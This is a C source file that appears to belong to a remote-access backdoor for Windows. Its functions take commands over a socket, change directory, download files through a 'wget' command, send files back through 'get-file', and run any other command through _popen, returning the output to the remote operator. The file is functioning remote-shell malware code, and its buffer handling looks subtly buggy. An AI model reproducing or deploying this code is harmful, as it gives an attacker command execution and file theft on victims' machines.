#include "../header/bin.h"

int process_command(struct main_struct *m_s)	// check if a command is a built in one
{
    if(my_strcmp(m_s->cmd, "exit\n")) {		// use custom my_strcmp to check
		m_s->cn = SOCKET_ERROR;			// close connection
	} else if((m_s->cmd[0] == 'c') && (m_s->cmd[1] == 'd') && (m_s->cmd[2] == ' ')){ // chdir command integration
		cd(m_s->cmd);
		sender(m_s->s, " ", 2, &m_s->cn);					// send data back.
	} else if(m_s->cmd[0] == 'w' && m_s->cmd[1] == 'g' && m_s->cmd[2] == 'e' && m_s->cmd[3] == 't' && m_s->cmd[4] == ' ') {	// downloader command
		wget(m_s->cmd);
		sender(m_s->s, "File Downloaded", 16, &m_s->cn);
    } else if(m_s->cmd[0] == 'g' && m_s->cmd[1] == 'e' && m_s->cmd[2] == 't' && m_s->cmd[3] == '-' && m_s->cmd[4] == 'f' && m_s->cmd[5] == 'i' && m_s->cmd[6] == 'l' && m_s->cmd[7] == 'e' && m_s->cmd[8] == ' ') {
        if(get_file(m_s->cmd,m_s->s) < 0){
            sender(m_s->s, "-1", 3, &m_s->cn);
        }
    }

	return 0;
}

int exe(struct main_struct *m_s)// execute commands that are unknown to the
{						// shell.
	FILE *cmd_f = _popen(m_s->cmd, "r");	// open the terminal for commands
	char ch;
	char *temp;
	int i, size, done;

	done = 0;
    ch = 1;
	size = 1024;
	if(cmd_f == NULL) {
		m_s->buf = malloc((23+strlen(m_s->cmd)) * sizeof(char));	// create a string of size 23
		sprintf(m_s->buf, "[Err]Command %s : not found!\n", m_s->cmd);	// to tell that <- command not found
	} else {
		i = 0;
		do {
			m_s->buf = malloc(size * sizeof(char));		// alocate a string of size size
			if (size > 1024 && m_s->buf != NULL){			// if its the first loop it will be 1024 so skip those line on first loop
				my_strcpy(m_s->buf, temp, strlen(temp));								// save temp into m_s->buf
				free(temp);													// free temp to be realocated after
			}
			temp = malloc(size * sizeof(char));		// allocate temporary (only used if
			if(m_s->buf == NULL || temp == NULL)	// output bigger than 1024)
				return -1;											// check errors
			while(((ch = fgetc(cmd_f)) != EOF) && i <= (size-1)) {
				m_s->buf[i] = ch;	// read from file and save to buf
				i++;												// increment i;
			}
			if((ch != EOF) && i <= size){	// if reading the output is not at eof
				my_strcpy(temp, m_s->buf, strlen(m_s->buf));	// save it to the temp
				size *= 2;		// add more size
				free(m_s->buf);		// free the buffer
			} else {
				m_s->buf[i] = '\0';		// end buff
				done = 1;
			}
		} while (!done);
	}
	_pclose(cmd_f);				// close terminal
	return 0;
}
